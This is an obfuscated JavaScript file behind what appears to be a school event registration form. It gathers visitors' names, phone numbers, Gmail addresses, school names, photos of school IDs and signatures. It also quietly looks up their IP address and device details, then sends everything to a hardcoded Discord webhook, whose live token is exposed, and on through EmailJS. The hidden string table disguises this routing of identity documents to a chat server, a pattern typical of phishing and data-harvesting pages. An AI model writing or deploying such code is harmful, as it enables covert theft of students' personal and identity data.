(function(){var __0x124=(function(){return["error","id_file","click","payload_json","trim","src","url","then","6sLPLKD","256px","text","No JSON response from Discord (likely 204).","registration_data_ssard","User","Failed to send data to Discord:","files[1]","Registration successful, but failed to send email links.","target","color","upload_section","style","warn","id_front.png","height","reuploadBtn","attachments","number","Please draw your signature.","qrBase64","https://api.ipify.org?format=json","red","signature.png","IP Address","init","email","message","template_t7ioajf","consentAcceptBtn","5FHIlpf","append","loadingOverlay","Name","setItem","SSDcjFdMjBWH15ZIq","upload","storedQR","name","draw_section","getItem","Email sent successfully!","result","Registration Bot","green","log","innerText","width","files[2]","Please attach the front of your school ID.","block","opacity","display","stringify","5207756xWeOHt","show","Invalid email address. Only Gmail addresses are allowed.","none","Device Info","send","remove","onload","hidden-start","files","608645BPZxsw","4034485vhfWAt","10187296mbCldN","active","mainContainer","alreadyRegisteredSection","registration_slots_left","charCodeAt","classList","Failed to load ID image. Please try again.","image/png","change","Error sending data to Discord:","toDataURL","querySelector","Invalid name. Only letters and spaces are allowed.","status","Registration successful! Please check your Gmail for confirmation.","Unknown","getElementById","borderRadius","Please enter your school name.","2222979ZKFdyy","json","8px","files[0]","slotsLeft","School","value","formSection","appendChild","innerHTML","add","flex","Number","test","clear","Registration is now closed. No slots left.","signature-pad","parse","textContent","qr_code.png","12905930agclQW","registeredName","Email","canvas","match","header","readAsDataURL","userAgent","reset","32210AMHEmF","Failed to retrieve IP address:","consentModal","18ogmgNQ","addEventListener","length","Invalid phone number. It must be a 10-digit number.","https://discord.com/api/webhooks/1325637445756256277/tVpZ_gEHaNbEjziqoN3OCLfcJ4OMymPXqFymJSzoFY9stI--aTvMbQWWCBKpnoI-lIZ5","Failed to send email:","checked","Please upload your signature.","onerror","POST","registrationForm"]})();function _0x1b0d(__a,__b){var __c=_0x2588();return(_0x1b0d=function(__x,__y){__x=__x-250;var __z=__c[__x];return __z})(__a,__b)}function _0x2588(){return __0x124}!function(__$,__E){for(;;){try{var __F=_0x1b0d,___0=parseInt(__F(271))/1+-parseInt(__F(322))/2+parseInt(__F(293))/3+parseInt(__F(261))/4*(parseInt(__F(374))/5)+-parseInt(__F(344))/6*(parseInt(__F(272))/7)+parseInt(__F(273))/8+-parseInt(__F(325))/9*(parseInt(__F(313))/10);if(___0===__E)break;__$().push(__$().shift())}catch(__G){__$().push(__$().shift())}}}(_0x2588,751343);const DISCORD_WEBHOOK_URL=_0x1b0d(329),EMAILJS_SERVICE_ID="service_lsgqvja",EMAILJS_TEMPLATE_ID=_0x1b0d(372),EMAILJS_USER_ID=_0x1b0d(379),LS_KEY=_0x1b0d(348),LS_SLOT_KEY=_0x1b0d(277),INITIAL_SLOTS=180;emailjs[_0x1b0d(369)](EMAILJS_USER_ID);const consentModal=document[_0x1b0d(290)](_0x1b0d(324)),consentAcceptBtn=document[_0x1b0d(290)](_0x1b0d(373)),loadingOverlay=document.getElementById(_0x1b0d(376)),mainContainer=document[_0x1b0d(290)](_0x1b0d(275)),header=document[_0x1b0d(290)](_0x1b0d(318)),footer=document[_0x1b0d(290)]("footer"),formSection=document[_0x1b0d(290)](_0x1b0d(300)),registrationForm=document[_0x1b0d(290)](_0x1b0d(335)),messageDiv=document[_0x1b0d(290)](_0x1b0d(371)),uploadRadio=document[_0x1b0d(290)](_0x1b0d(380)),drawRadio=document[_0x1b0d(290)]("draw"),uploadSection=document[_0x1b0d(290)](_0x1b0d(355)),drawSection=document[_0x1b0d(290)](_0x1b0d(383)),clearButton=document[_0x1b0d(290)](_0x1b0d(307)),alreadyRegisteredSection=document[_0x1b0d(290)](_0x1b0d(276)),registeredNameSpan=document[_0x1b0d(290)](_0x1b0d(314)),storedQRDiv=document.getElementById(_0x1b0d(381)),reuploadBtn=document[_0x1b0d(290)](_0x1b0d(360)),qrCodeDisplay=document[_0x1b0d(290)](_0x1b0d(381)),slotsLeftSpan=document.getElementById(_0x1b0d(297)),canvas=document.getElementById(_0x1b0d(309)),signaturePad=new SignaturePad(canvas);function initializeApp(){let __H=_0x1b0d;localStorage[__H(384)](LS_SLOT_KEY)||localStorage[__H(378)](LS_SLOT_KEY,180),updateSlotsDisplay();let __I=JSON.parse(localStorage[__H(384)](LS_KEY))||null;if(__I&&__I[__H(370)])consentModal[__H(356)][__H(259)]=__H(264),showAlreadyRegistered(__I);else{let __J=parseInt(localStorage[__H(384)](LS_SLOT_KEY),10);__J>0?consentModal[__H(356)][__H(259)]=__H(304):(mainContainer[__H(279)][__H(303)](__H(262)),header[__H(279)][__H(303)]("show"),footer[__H(279)][__H(303)](__H(262)),displayMessage(__H(308),__H(366)))}consentModal[__H(356)].display&&"none"!==consentModal[__H(356)][__H(259)]||(mainContainer[__H(279)].add("show"),header[__H(279)][__H(303)](__H(262)),footer[__H(279)].add(__H(262)))}function toggleSignatureMethod(){let __K=_0x1b0d;uploadRadio[__K(331)]?(uploadSection[__K(356)][__K(259)]=__K(257),drawSection[__K(356)].display="none"):(uploadSection.style.display=__K(264),drawSection.style.display="block")}async function handleFormSubmit(__L){let __M=_0x1b0d;__L.preventDefault(),showLoading(!0);let __N=document[__M(290)]("name").value.trim(),__O=document[__M(290)](__M(362))[__M(299)].trim(),__P=document[__M(290)](__M(370))[__M(299)][__M(340)](),__Q=document[__M(290)]("school_name")[__M(299)][__M(340)](),__R=document[__M(290)](__M(337))[__M(270)][0],__S=document.querySelector('input[name="signature_type"]:checked')[__M(299)],__T=document[__M(290)]("signature_file")[__M(270)][0],__U=validateFormInputs(__N,__O,__P,__Q,__R,__S,__T);if(__U){displayMessage(__U,"red"),showLoading(!1);return}let __V="";if(__S===__M(380))try{__V=await convertFileToBase64(__T)}catch(__W){displayMessage("Failed to read signature file.",__M(366)),showLoading(!1);return}else{if(signaturePad.isEmpty()){displayMessage(__M(363),"red"),showLoading(!1);return}__V=signaturePad[__M(284)](__M(281))}let __X="";try{__X=await convertFileToBase64(__R)}catch(__Y){displayMessage(__M(280),__M(366)),showLoading(!1);return}let __Z=__M(289),__a=navigator[__M(320)]||__M(289);try{let __b=await fetch(__M(365));if(__b.ok){let __c=await __b[__M(294)]();__Z=__c.ip||__M(289)}}catch(__d){console[__M(357)](__M(323),__d)}qrCodeDisplay[__M(302)]="",new QRCode(qrCodeDisplay,{text:JSON[__M(260)]({name:__N,number:__O,email:__P,schoolName:__Q,registered:!0}),width:256,height:256}),await new Promise(__e=>setTimeout(__e,500));let __f=qrCodeDisplay[__M(285)](__M(316)),__g=__f[__M(284)](__M(281)),__h=await dataURLToBlob(__g),__i=await dataURLToBlob(__V),__j=await dataURLToBlob(__X),__k=new FormData,__l={username:__M(250),embeds:[{title:"New Registration",color:7103487,fields:[{name:__M(377),value:__N},{name:__M(305),value:__O},{name:__M(315),value:__P},{name:__M(298),value:__Q},{name:__M(368),value:__Z},{name:__M(265),value:__a},{name:"Registered",value:"âœ…"}],timestamp:new Date}]};__k.append(__M(339),JSON[__M(260)](__l)),__k[__M(375)](__M(296),__h,__M(312)),__k[__M(375)](__M(351),__i,__M(367)),__k.append(__M(255),__j,__M(358));try{let __m=await fetch(DISCORD_WEBHOOK_URL,{method:__M(334),body:__k});if(__m.ok){let __n="",__o="",__p="",__q=null;try{__q=await __m[__M(294)]()}catch(__r){console[__M(357)](__M(347))}__q&&__q.attachments&&(__q.attachments[0]&&(__n=__q[__M(361)][0][__M(342)]),__q[__M(361)][1]&&(__o=__q[__M(361)][1][__M(342)]),__q[__M(361)][2]&&(__p=__q[__M(361)][2][__M(342)]));let __s={name:__N,email:__P,number:__O,school_name:__Q,qr_image_url:__n,signature_url:__o,id_front_url:__p,ip_address:__Z,device_info:__a};emailjs[__M(266)]("service_lsgqvja",EMAILJS_TEMPLATE_ID,__s)[__M(343)](function(__t){let __u=__M;console[__u(252)](__u(385),__t[__u(287)],__t[__u(346)]),displayMessage(__u(288),__u(251));let __v={name:__N,email:__P,number:__O,schoolName:__Q,qrBase64:__g};localStorage.setItem(LS_KEY,JSON[__u(260)](__v));let __w=parseInt(localStorage.getItem(LS_SLOT_KEY),10);__w=__w>0?__w-1:0,localStorage.setItem(LS_SLOT_KEY,__w),updateSlotsDisplay(),registrationForm[__u(321)](),signaturePad[__u(307)](),showLoading(!1),showAlreadyRegistered(__v)},function(__x){let __y=__M;console[__y(336)](__y(330),__x),displayMessage(__y(352),"orange");let __z={name:__N,email:__P,number:__O,schoolName:__Q,qrBase64:__g};localStorage[__y(378)](LS_KEY,JSON[__y(260)](__z));let __A=parseInt(localStorage.getItem(LS_SLOT_KEY),10);__A=__A>0?__A-1:0,localStorage[__y(378)](LS_SLOT_KEY,__A),updateSlotsDisplay(),registrationForm[__y(321)](),signaturePad.clear(),showLoading(!1),showAlreadyRegistered(__z)})}else console.error(__M(350),__m.statusText),displayMessage("Failed to send registration data. Please try again later.",__M(366)),showLoading(!1)}catch(__B){console.error(__M(283),__B),displayMessage("An error occurred. Please try again later.",__M(366)),showLoading(!1)}}function validateFormInputs(__C,__D,__E,__F,__G,__H,__I){let __J=_0x1b0d;return/^[A-Za-z\s]+$/[__J(306)](__C)?/^\d{10}$/[__J(306)](__D)?/^[^\s@]+@gmail\.com$/.test(__E)?__F?__G?__H!==__J(380)||__I?null:__J(332):__J(256):__J(292):__J(263):__J(328):__J(286)}function displayMessage(__K,__L){let __M=_0x1b0d;messageDiv[__M(253)]=__K,messageDiv[__M(356)][__M(354)]=__L,messageDiv[__M(356)][__M(258)]="1",setTimeout(()=>{let __N=__M;messageDiv[__N(356)][__N(258)]="0"},5e3)}function showLoading(__O){let __P=_0x1b0d;__O?loadingOverlay[__P(279)][__P(303)]("active"):loadingOverlay[__P(279)].remove(__P(274))}function showAlreadyRegistered(__Q){let __R=_0x1b0d;formSection[__R(279)][__R(303)](__R(269)),formSection[__R(279)][__R(267)](__R(262)),alreadyRegisteredSection[__R(279)].remove(__R(269)),alreadyRegisteredSection[__R(279)][__R(303)]("show"),registeredNameSpan[__R(311)]=__Q[__R(382)]||__R(349),storedQRDiv[__R(302)]="",__Q[__R(364)]&&(function(){let __S=new Image;__S[__R(341)]=__Q.qrBase64,__S[__R(356)][__R(254)]=__R(345),__S.style[__R(359)]=__R(345),__S.style[__R(291)]=__R(295),storedQRDiv[__R(301)](__S)}());let __T=parseInt(localStorage[__R(384)](LS_SLOT_KEY),10);__T<=0&&displayMessage("All slots have been filled. Registration is now closed.",__R(366))}function updateSlotsDisplay(){let __U=_0x1b0d,__V=parseInt(localStorage.getItem(LS_SLOT_KEY),10);if(slotsLeftSpan.textContent=__V>0?__V:"0",__V<=0){let __W=JSON[__U(310)](localStorage[__U(384)](LS_KEY))||null;__W&&__W[__U(370)]||(formSection[__U(279)][__U(303)](__U(269)),formSection.classList.remove(__U(262)),displayMessage("Registration is now closed. No slots left.","red"))}}function convertFileToBase64(__X){return new Promise(function(__Y,__Z){let __a=_0x1b0d,__b=new FileReader;__b[__a(268)]=function(__c){return __Y(__c[__a(353)][__a(386)])},__b[__a(333)]=function(__d){return __Z(__d)},__b[__a(319)](__X)})}function dataURLToBlob(__e){let __f=_0x1b0d,__g=__e.split(","),__h=__g[0][__f(317)](/:(.*?);/),__i=__h?__h[1]:"",__j=atob(__g[1]),__k=__j[__f(327)],__l=new Uint8Array(__k);for(;__k--;)__l[__k]=__j[__f(278)](__k);return new Blob([__l],{type:__i})}consentAcceptBtn[_0x1b0d(326)](_0x1b0d(338),function(){let __m=_0x1b0d;consentModal.style.display=__m(264),initializeApp()}),uploadRadio[_0x1b0d(326)]("change",toggleSignatureMethod),drawRadio[_0x1b0d(326)](_0x1b0d(282),toggleSignatureMethod),clearButton[_0x1b0d(326)](_0x1b0d(338),function(){let __n=_0x1b0d;signaturePad[__n(307)]()}),reuploadBtn[_0x1b0d(326)]("click",function(){let __o=_0x1b0d;alreadyRegisteredSection[__o(279)][__o(303)](__o(269)),alreadyRegisteredSection[__o(279)][__o(267)](__o(262)),formSection[__o(279)][__o(267)](__o(269)),formSection.classList[__o(303)](__o(262)),messageDiv.innerText=""}),registrationForm[_0x1b0d(326)]("submit",handleFormSubmit);})();
